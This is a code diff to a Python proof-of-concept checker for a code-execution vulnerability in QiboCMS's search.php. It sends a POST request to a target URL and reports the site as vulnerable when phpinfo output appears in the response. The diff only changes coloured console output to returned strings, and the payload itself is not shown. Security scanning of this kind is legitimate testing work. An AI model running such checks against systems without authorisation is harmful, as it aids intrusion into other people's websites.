@@ -9,8 +9,8 @@ description: search.php代码执行。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class qibocms_search_code_exec_BaseVerify:
     def __init__(self, url):
@@ -30,12 +30,12 @@ class qibocms_search_code_exec_BaseVerify:
             }
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req.text:
-                cprint("[+]存在qibo分类系统search.php 代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return "[+]存在qibo分类系统search.php 代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = qibocms_search_code_exec_BaseVerify(sys.argv[1])
     testVuln.run()
